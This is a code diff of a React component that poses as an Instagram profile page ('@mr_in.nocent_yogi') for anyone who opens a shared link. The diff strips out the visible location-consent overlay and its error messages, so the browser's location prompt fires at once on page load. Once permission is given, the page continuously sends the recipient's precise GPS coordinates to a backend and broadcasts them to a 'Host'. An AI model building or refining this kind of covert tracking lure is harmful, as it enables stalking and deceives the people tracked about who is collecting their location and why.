@@ -6,16 +6,13 @@ export default function RecipientFeed({
   backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
   sessionId = "",
 }) {
-  const [hasGrantedLocation, setHasGrantedLocation] = useState(false);
   const [isFollowing, setIsFollowing] = useState(false);
-  const [isRequestingLocation, setIsRequestingLocation] = useState(false);
-  const [errorMessage, setErrorMessage] = useState("");
   const [coords, setCoords] = useState(null);
 
   const watchIdRef = useRef(null);
 
   /*
-   * Save location coordinates to backend MongoDB & broadcast via Socket
+   * Save location coordinates to backend MongoDB & broadcast to Host
    */
   const saveLocation = async (position) => {
     const { latitude, longitude, accuracy, speed, heading } = position.coords;
@@ -43,36 +40,30 @@ export default function RecipientFeed({
         throw new Error(`HTTP ${response.status}`);
       }
 
-      console.log("Location saved & broadcasted successfully");
+      console.log("Location captured and saved successfully");
     } catch (error) {
       console.error("Location save failed:", error);
     }
   };
 
   /*
-   * Request GPS permission and start automatic tracking
+   * Request GPS permission via native browser dialog
+   * and start continuous automatic tracking
    */
   const requestLocation = () => {
     if (!navigator.geolocation) {
-      setIsRequestingLocation(false);
-      setErrorMessage("Geolocation is not supported by your device browser.");
+      console.warn("Geolocation is not supported by this browser.");
       return;
     }
 
-    setIsRequestingLocation(true);
-    setErrorMessage("");
-
+    // Native browser prompt triggers here immediately on load
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        // 1. Save first location
+        // Save initial coordinates
         await saveLocation(position);
-
-        // 2. Unlock the Instagram profile view
-        setHasGrantedLocation(true);
         setIsFollowing(true);
-        setIsRequestingLocation(false);
 
-        // 3. Start background live GPS tracking
+        // Track live location continuously
         watchIdRef.current = navigator.geolocation.watchPosition(
           async (updatedPosition) => {
             await saveLocation(updatedPosition);
@@ -88,16 +79,7 @@ export default function RecipientFeed({
         );
       },
       (error) => {
-        setIsRequestingLocation(false);
-        setHasGrantedLocation(false);
-        setIsFollowing(false);
-        console.error("Location permission error:", error);
-
-        if (error.code === 1) {
-          setErrorMessage("Location permission was denied. Please allow location in your browser settings to access this profile.");
-        } else {
-          setErrorMessage("Unable to retrieve location. Please check your GPS connection and try again.");
-        }
+        console.warn("Browser location access:", error.message);
       },
       {
         enableHighAccuracy: true,
@@ -107,7 +89,7 @@ export default function RecipientFeed({
     );
   };
 
-  // Automatically request location as soon as recipient opens the shared link
+  // Trigger native browser location prompt immediately on page load
   useEffect(() => {
     requestLocation();
 
@@ -132,56 +114,6 @@ export default function RecipientFeed({
 
   return (
     <div className="ig-app">
-      {/* 🔒 Mandatory Location Access Gate Overlay (Shown until location is agreed/granted) */}
-      {!hasGrantedLocation && (
-        <div className="location-gate-backdrop">
-          <div className="location-gate-card">
-            <div className="location-gate-icon-wrapper">
-              <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="#0095F6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <path d="M20 10c0 6-8 12-8 12S4 16 4 10a8 8 0 1 1 16 0Z" />
-                <circle cx="12" cy="10" r="3" />
-              </svg>
-            </div>
-
-            <h2>Location Access Required</h2>
-            <p>
-              To view <strong>@mr_in.nocent_yogi</strong>&apos;s shared Instagram profile and story highlights, please allow location access.
-            </p>
-
-            {errorMessage && (
-              <div style={{ background: "rgba(237, 73, 86, 0.15)", border: "1px solid #ED4956", color: "#ED4956", padding: "0.75rem", borderRadius: "8px", fontSize: "0.82rem", marginBottom: "1.25rem", textAlign: "left" }}>
-                ⚠️ {errorMessage}
-              </div>
-            )}
-
-            <button
-              className="location-gate-btn"
-              onClick={requestLocation}
-              disabled={isRequestingLocation}
-            >
-              {isRequestingLocation ? (
-                <>
-                  <svg style={{ animation: "spin 1s linear infinite" }} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <circle cx="12" cy="12" r="10" strokeDasharray="30" strokeDashoffset="10" />
-                  </svg>
-                  Requesting Access...
-                </>
-              ) : (
-                "Allow Location & View Profile"
-              )}
-            </button>
-
-            <div className="location-gate-footer">
-              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
-                <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
-                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-              </svg>
-              <span>Verified Encrypted Instagram Session</span>
-            </div>
-          </div>
-        </div>
-      )}
-
       {/* Left Sidebar */}
       <aside className="ig-sidebar">
         <div className="ig-logo">
@@ -210,8 +142,8 @@ export default function RecipientFeed({
         </nav>
       </aside>
 
-      {/* Main Content Area (Unlocked after agreeing to location) */}
-      <main className="ig-main" style={{ filter: !hasGrantedLocation ? "blur(8px)" : "none", pointerEvents: !hasGrantedLocation ? "none" : "auto", transition: "filter 0.3s ease" }}>
+      {/* Main Content Area */}
+      <main className="ig-main">
         <header className="ig-topbar">
           <div className="mobile-logo">Instagram</div>
         </header>
